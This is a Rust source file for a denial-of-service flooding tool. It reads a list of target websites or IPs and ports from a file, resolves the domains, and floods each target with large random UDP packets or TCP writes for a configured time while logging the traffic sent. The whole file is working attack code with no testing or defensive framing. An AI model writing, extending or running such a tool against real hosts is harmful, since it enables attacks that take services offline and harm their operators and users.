#[macro_use]
extern crate log;

extern crate pretty_env_logger;

use std::collections::HashMap;
use std::io::Write;
use std::net::TcpStream;
use std::str::FromStr;
use std::{
    fmt::{Debug, Display, Formatter},
    fs::File,
    io::{BufRead, BufReader},
    net::{SocketAddr, UdpSocket},
    sync::{Arc, Mutex},
    thread::sleep,
    time::{Duration, Instant},
};

use anyhow::*;
use dns_lookup::lookup_host;
use itertools::Itertools;
use online::sync::check;
use portpicker::pick_unused_port;
use rand::{thread_rng, RngCore};
use rayon::prelude::*;

// ----- Attack Config START -----
#[derive(Clone)]
struct Config {
    execution_time: u64,
    timeout: Duration,
    packet_size: usize,
    default_ports: Vec<String>,
    unreachable_stop_trying: bool,
    summary: bool,
    default_attack_methods: Vec<AttackMethod>,
    tcp_connection_timeout: Duration,
}

impl Config {
    pub fn load() -> Result<Self> {
        info!("Loading Main Config File...");

        let config_file = File::open("config")?;
        let config_lines = BufReader::new(config_file).lines();

        // Default execution time - a minute
        let mut execution_time = 60;

        // Default timeout - 10ms
        let mut timeout = 10;

        // Default packet size - 65000 bytes
        let mut packet_size = 65000;

        let mut default_ports = vec![];

        // Default for stop trying to attack unreachable anymore websites - true
        let mut unreachable_stop_trying = true;

        // Default for showing summary - true
        let mut summary = true;

        let mut default_attack_methods = vec![];

        // Default tcp connection timeout - 5 seconds
        let mut tcp_connection_timeout = 5;

        for config_line in config_lines.flatten() {
            if config_line.is_empty() || config_line.trim().starts_with("//") {
                continue;
            }

            let mut split = config_line.split(' ');

            if let Some(first) = split.next() {
                match first {
                    "execution_time" => {
                        if let Some(ex_time) = split.next() {
                            execution_time = ex_time.parse()?;
                        }
                    }
                    "timeout" => {
                        if let Some(t_out) = split.next() {
                            timeout = t_out.parse()?;
                        }
                    }
                    "packet_size" => {
                        if let Some(p_size) = split.next() {
                            packet_size = p_size.parse()?;
                        }
                    }
                    "default_ports" => {
                        while let Some(port) = split.next() {
                            default_ports.push(port.to_string());
                        }
                    }
                    "unreachable_stop_trying" => {
                        if let Some(u_s_t) = split.next() {
                            unreachable_stop_trying = match u_s_t.to_lowercase().as_str() {
                                "true" => true,
                                "false" => false,
                                _ => true,
                            }
                        }
                    }
                    "summary" => {
                        if let Some(sum) = split.next() {
                            summary = match sum.to_lowercase().as_str() {
                                "true" => true,
                                "false" => false,
                                _ => true,
                            }
                        }
                    }
                    "default_attack_methods" => {
                        while let Some(attack_method) = split.next() {
                            default_attack_methods.push(AttackMethod::from_str(attack_method)?)
                        }
                    }
                    "tcp_connection_timeout" => {
                        if let Some(t_c_t) = split.next() {
                            tcp_connection_timeout = t_c_t.parse()?;
                        }
                    }
                    _ => {}
                }
            }
        }

        // Default port if not set - 80
        if default_ports.is_empty() {
            default_ports.push("80".to_string());
        }

        // Default attack method if not set - UDP
        if default_attack_methods.is_empty() {
            default_attack_methods.push(AttackMethod::Udp);
        }

        let config = Config {
            execution_time,
            timeout: Duration::from_millis(timeout),
            packet_size,
            default_ports,
            unreachable_stop_trying,
            summary,
            default_attack_methods,
            tcp_connection_timeout: Duration::from_secs(tcp_connection_timeout),
        };

        info!("Loaded config: {}", config);

        Ok(config)
    }
}

impl Display for Config {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "Config {{ execution_time: {}s, timeout: {}ms, packet_size: {} bytes, default_ports: [{}], unreachable_stop_trying: {}, summary: {}, default_attack_methods: [{}], tcp_connection_timeout: {} }}",
            self.execution_time,
            self.timeout.as_millis(),
            self.packet_size,
            self.default_ports.join(", "),
            self.unreachable_stop_trying,
            self.summary,
            self.default_attack_methods.iter().map(|attack_method| attack_method.to_str()).join(", "),
            self.tcp_connection_timeout.as_secs()
        )
    }
}
// ----- Attack Config END -----

// ----- Attack Method START -----
#[derive(Copy, Clone, Eq, PartialEq, Hash)]
enum AttackMethod {
    Udp,
    Tcp,
}

impl AttackMethod {
    pub fn to_str(&self) -> String {
        match self {
            AttackMethod::Udp => "udp".to_string(),
            AttackMethod::Tcp => "tcp".to_string(),
        }
    }

    pub fn from_str(rhs: &str) -> Result<Self> {
        match rhs.to_lowercase().as_str() {
            "udp" => Ok(AttackMethod::Udp),
            "tcp" => Ok(AttackMethod::Tcp),
            _ => bail!("Not implemented method!"),
        }
    }
}

impl Default for AttackMethod {
    fn default() -> Self {
        AttackMethod::Udp
    }
}

impl Display for AttackMethod {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "{}",
            match self {
                AttackMethod::Udp => "udp",
                AttackMethod::Tcp => "tcp",
            }
        )
    }
}
// ----- Attack Method END -----

// ----- Website Configuration START -----
#[derive(Clone)]
struct WebsiteConfig {
    pub address: String,
    pub ports: Vec<String>,
    pub is_domain: bool,
    pub attack_methods: Vec<AttackMethod>,
}

impl WebsiteConfig {
    pub fn load_configs(config: &Config) -> Result<Vec<WebsiteConfig>> {
        info!("Loading websites configs...");

        let configs = Arc::new(Mutex::new(vec![]));
        let websites_file = File::open("websites")?;
        let websites = BufReader::new(websites_file).lines();

        websites
            .flatten()
            .collect::<Vec<_>>()
            .par_iter()
            .for_each(|website| match Self::load(website, config) {
                None => return,
                Some(website_config) => (*configs).lock().unwrap().push(website_config),
            });

        info!("All websites loaded!\n{:?}", configs);

        let res = Ok(configs.lock().unwrap().clone());
        res
    }

    fn load(website: &str, config: &Config) -> Option<WebsiteConfig> {
        if website.is_empty() || website.trim().starts_with("//") {
            return None;
        }

        let mut split = website.split(' ');

        if let Some(first) = split.next() {
            let is_domain = match first {
                "ip" => false,
                "domain" => true,
                _ => false,
            };

            if let Some(address) = split.next() {
                let mut attack_methods = vec![];
                let mut ports = vec![];

                while let Some(next) = split.next() {
                    match next.to_lowercase().as_str() {
                        "udp" => attack_methods.push(AttackMethod::Udp),
                        "tcp" => attack_methods.push(AttackMethod::Tcp),
                        _ => {
                            ports.push(next.to_string());
                            break;
                        }
                    }
                }

                while let Some(port) = split.next() {
                    ports.push(port.to_string());
                }

                if attack_methods.is_empty() {
                    attack_methods = config.default_attack_methods.clone();
                }

                if ports.is_empty() {
                    ports = config.default_ports.clone();
                }

                for port in ports.iter() {
                    for attack_method in attack_methods.iter() {
                        info!(
                            "Found {} {} with port {} and {} method of attack",
                            if is_domain { "domain" } else { "ip" },
                            address,
                            port,
                            attack_method.to_str().to_uppercase()
                        );
                    }
                }

                return Some(WebsiteConfig {
                    address: address.to_string(),
                    ports,
                    is_domain,
                    attack_methods,
                });
            }

            return None;
        }

        return None;
    }
}

impl Debug for WebsiteConfig {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        let spacing = if self.is_domain { " " } else { "" };

        let mut output = vec![];

        for port in self.ports.iter() {
            for attack_method in self.attack_methods.iter() {
                output.push(format!(
                    "{}{}:{}{}{}/{}{}",
                    self.address,
                    spacing,
                    spacing,
                    port,
                    spacing,
                    spacing,
                    attack_method.to_str()
                ));
            }
        }

        write!(f, "[{}]", output.join(", "))
    }
}
// ----- Website Configuration END -----

// ----- Attack Summary START -----
#[derive(Default, Clone)]
struct PacketSummary {
    amount: u128,
    size: u128,
}

impl PacketSummary {
    pub fn show(&self, socket_address: &str) {
        info!(
            "Socket Address: {}, Packets Sent: {}, Sum Packet Size: {}B",
            socket_address,
            self.amount,
            Self::packet_size_output(self.size)
        );
    }

    fn packet_size_output(size: u128) -> String {
        let mut output = format!("{}B", size);

        let mut size = size as f64 / 1000.0;
        if size >= 1.0 {
            output += &format!(" ({}MiB", size);

            size /= 1000.0;
            if size >= 1.0 {
                output += &format!(", {}GiB", size);
            }

            output += ")";
        }

        output
    }
}
// ----- Attack Summary END -----

// ----- Attack Websites START -----
struct Attacker {
    config: Config,
    website_configs: Vec<WebsiteConfig>,
    summary: Arc<Mutex<HashMap<String, HashMap<AttackMethod, PacketSummary>>>>,
}

impl Attacker {
    pub fn new() -> Result<Self> {
        let config = Config::load()?;
        let website_configs = WebsiteConfig::load_configs(&config)?;

        Ok(Self {
            config,
            website_configs,
            summary: Arc::new(Mutex::new(HashMap::new())),
        })
    }

    pub fn attack_websites(&self) {
        let socket_addresses = Arc::new(Mutex::new(vec![]));

        self.website_configs.par_iter().for_each(|website_config| {
            if !website_config.is_domain {
                website_config.ports.par_iter().for_each(|port| {
                    website_config
                        .attack_methods
                        .par_iter()
                        .for_each(|attack_method| {
                            (*socket_addresses).lock().unwrap().push((
                                format!("{}:{}", website_config.address, port.clone()),
                                attack_method,
                            ));
                        });
                });
            } else {
                if let std::result::Result::Ok(ips) = lookup_host(&website_config.address) {
                    ips.par_iter().for_each(|ip| {
                        website_config.ports.par_iter().for_each(|port| {
                            website_config
                                .attack_methods
                                .par_iter()
                                .for_each(|attack_method| {
                                    (*socket_addresses)
                                        .lock()
                                        .unwrap()
                                        .push((format!("{}:{}", ip, port), attack_method));
                                });
                        });
                    });
                } else {
                    error!(
                        "Couldn't find ips for the domain {}",
                        website_config.address
                    );
                }
            }
        });

        let socket_addresses = (*socket_addresses)
            .lock()
            .unwrap()
            .clone()
            .into_iter()
            .unique()
            .collect::<Vec<_>>();

        let start = Instant::now();

        info!("Starting attack on the websites...");

        socket_addresses
            .par_iter()
            .for_each(|(socket_address, attack_method)| {
                let sender: SocketAddr = format!(
                    "0.0.0.0:{}",
                    pick_unused_port().expect("No free port found!")
                )
                .parse()
                .expect("Couldn't get sender IP address");

                info!(
                    "Attacking {} with {} method",
                    socket_address,
                    attack_method.to_str().to_uppercase()
                );

                let buffer = self.generate_buffer();

                match attack_method {
                    AttackMethod::Udp => {
                        self.attack_udp(start, sender, socket_address, buffer.as_slice())
                    }
                    AttackMethod::Tcp => self.attack_tcp(start, socket_address, buffer.as_slice()),
                }
            });

        if self.config.summary {
            self.show_summary()
        }
    }

    fn attack_udp(
        &self,
        start: Instant,
        sender: SocketAddr,
        socket_address: &String,
        buffer: &[u8],
    ) {
        let attack_method: AttackMethod = AttackMethod::Udp;
        let attack_method_str: String = attack_method.to_str().to_uppercase();

        let mut summary_added = false;

        info!("Creating socket for {} ...", sender);
        let socket = UdpSocket::bind(sender).expect(&format!("Couldn't bind socket to {}", sender));

        while start.elapsed().as_secs() < self.config.execution_time {
            match socket.connect(socket_address.clone()) {
                std::result::Result::Ok(_) => {
                    if self.config.summary && !summary_added {
                        summary_added = true;

                        self.add_to_summary(socket_address.clone(), attack_method);
                    }

                    if !self.check_result(
                        socket.send(buffer),
                        socket_address.clone(),
                        attack_method,
                        attack_method_str.clone(),
                    ) {
                        break;
                    }

                    sleep(self.config.timeout);
                }
                std::result::Result::Err(error) => {
                    error!(
                        "Couldn't connect to {} using {} method.\nError message: {}",
                        socket_address, attack_method_str, error
                    );

                    break;
                }
            }
        }
    }

    fn attack_tcp(&self, start: Instant, socket_address: &String, buffer: &[u8]) {
        let attack_method: AttackMethod = AttackMethod::Tcp;
        let attack_method_str: String = AttackMethod::Tcp.to_str().to_uppercase();

        let mut stream: TcpStream;

        info!("Creating TcpStream to {}", socket_address);

        let socket_addr = SocketAddr::from_str(socket_address.as_str());

        if socket_addr.is_err() {
            error!(
                "Couldn't create a socket address out of {}.\nError message: {}",
                socket_address,
                socket_addr.err().unwrap()
            );

            return;
        }

        match TcpStream::connect_timeout(&socket_addr.unwrap(), self.config.tcp_connection_timeout)
        {
            std::result::Result::Ok(s) => {
                info!("Successfully connected stream to remote host!");

                stream = s;

                if self.config.summary {
                    self.add_to_summary(socket_address.clone(), attack_method);
                }
            }
            Err(error) => {
                error!(
                    "Couldn't connect TCP stream to {} using {} method.\nError message: {}",
                    socket_address, attack_method_str, error
                );
                return;
            }
        }

        while start.elapsed().as_secs() < self.config.execution_time {
            if !self.check_result(
                stream.write(buffer),
                socket_address.clone(),
                attack_method,
                attack_method_str.clone(),
            ) {
                break;
            }

            sleep(self.config.timeout);
        }
    }

    fn generate_buffer(&self) -> Vec<u8> {
        let mut buffer = Vec::with_capacity(self.config.packet_size);
        unsafe {
            buffer.set_len(self.config.packet_size);
        }

        thread_rng().fill_bytes(buffer.as_mut_slice());

        buffer
    }

    fn add_to_summary(&self, socket_address: String, attack_method: AttackMethod) {
        let mut summary = (*self.summary).lock().unwrap();

        if let Some(socket_summary) = summary.get_mut(&socket_address) {
            socket_summary.insert(attack_method, PacketSummary::default());
        } else {
            summary.insert(socket_address.clone(), {
                let mut socket_summary = HashMap::new();
                socket_summary.insert(attack_method, PacketSummary::default());

                socket_summary
            });
        }
    }

    fn check_result(
        &self,
        res: std::io::Result<usize>,
        socket_address: String,
        attack_method: AttackMethod,
        attack_method_str: String,
    ) -> bool {
        match res {
            std::result::Result::Ok(size) => {
                info!(
                    "Successfully sent a packet of size {} to {} using {} method",
                    size, socket_address, attack_method_str
                );

                self.update_summary(socket_address.clone(), attack_method, size as u128);

                true
            }
            std::result::Result::Err(error) => {
                error!(
                    "Failed to send a packet to {} using {} method.\nError message: {}",
                    socket_address, attack_method_str, error
                );

                !self.config.unreachable_stop_trying
            }
        }
    }

    fn update_summary(&self, socket_address: String, attack_method: AttackMethod, size: u128) {
        if self.config.summary {
            if let Some(summary) = (*self.summary).lock().unwrap().get_mut(&socket_address) {
                if let Some(socket_summary) = summary.get_mut(&attack_method) {
                    socket_summary.size += size;
                    socket_summary.amount += 1;
                }
            }
        }
    }

    fn show_summary(&self) {
        info!("~~~~~~~ Attack Summary START ~~~~~~~");
        let mut sum_packets = 0;
        let mut sum_packet_size = 0;

        for (socket_address, socket_summary) in (*self.summary).lock().unwrap().iter() {
            for (_, packet_summary) in socket_summary.iter() {
                sum_packets += packet_summary.amount;
                sum_packet_size += packet_summary.size;

                packet_summary.show(socket_address);
            }
        }

        info!(
            "Sum Packets Sent: {}, Sum Packets Size: {}",
            sum_packets,
            PacketSummary::packet_size_output(sum_packet_size)
        );
        info!("~~~~~~~ Attack Summary END ~~~~~~~");
    }
}
// ----- Attack Websites END -----

fn main() -> Result<()> {
    std::env::set_var("RUST_LOG", "info");

    pretty_env_logger::init_timed();

    if let Err(error) = check(None) {
        error!(
            "Connectivity Issues! Check your internet connection!\nError message: {}",
            error
        );

        return Ok(());
    }

    let attacker = Attacker::new()?;
    attacker.attack_websites();

    Ok(())
}
